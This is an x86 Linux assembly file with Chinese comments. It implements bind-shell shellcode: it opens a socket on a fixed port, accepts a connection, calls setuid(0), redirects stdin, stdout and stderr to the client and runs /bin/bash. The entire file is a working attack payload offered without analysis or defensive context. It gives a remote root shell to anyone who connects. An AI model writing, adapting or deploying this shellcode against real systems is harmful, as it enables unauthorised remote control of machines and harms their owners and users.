global _start

_start:

; int server = socket(2, 1, 0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
mov bl, 0x2
mov cl, 0x1
mov ax, 359
int 0x80
mov esi, eax ; 结果存入esi中

; bind(server, (struct socrkaddr*)&server_addr, sizeof(server_addr))
xor eax, eax
xor ecx, ecx
push eax        ; 0x0
push eax        ; 0x0
push eax        ; 0x0
mov eax, 0x851a0002 ; 0x851a0002
push eax
xor eax, eax
mov ebx, esi    ; server
mov ecx, esp    ; &server_addr 0x851a0002	0x00000000	0x00000000	0x0000000
xor edx, edx
mov dl, 0x10    ; sizeof(server_addr) -> 16
mov ax, 361
int 0x80

; listen(server, 128)
xor ecx, ecx
mov ebx, esi    ; server
mov cl, 128     ; 128
mov ax, 363
int 0x80

; int client = accept4(server, (struct sockaddr*)&client_addr, &len, 0);
mov ebx, esi    ; server
xor edx, edx    ; flag 0
xor eax, eax
push eax        ; 0x00
push eax        ; 0x00
push eax        ; 0x00
push eax        ; 0x00
mov ecx, esp    ; client_addr
mov al, 0x10     ; 16
push eax
mov edx, esp    ; &len
xor esi, esi    ; 0
mov ax, 364
int 0x80
mov edi, eax    ; 结果存入edi中

; setuid(0)
xor eax, eax
xor ebx, ebx    ; 0
mov al, 23
int 0x80

; 重定向STDIN STDOUT STDERR 至client
xor eax, eax
xor ecx, ecx    ; ecx清零
mov ebx, edi    ; client
mov al, 63
int 0x80        ; dup2(client, STDIN)
xor eax, eax
mov al, 63
inc ecx
int 0x80        ; dup2(client, STDOUT)
xor eax, eax
mov al, 63
inc ecx
int 0x80        ; dup2(client, STDERR)

; execve("/bin/bash", NULL, NULL)
xor eax, eax
xor ebx, ebx
xor ecx, ecx        ; NULL
xor edx, edx        ; NULL
mov al, 0x68
push eax
mov eax, 0x7361622f
push eax
mov eax, 0x6e69622f
push eax ;/bin/bash 
mov ebx, esp        ; /bin/bash
xor eax, eax
mov al, 11
int 0x80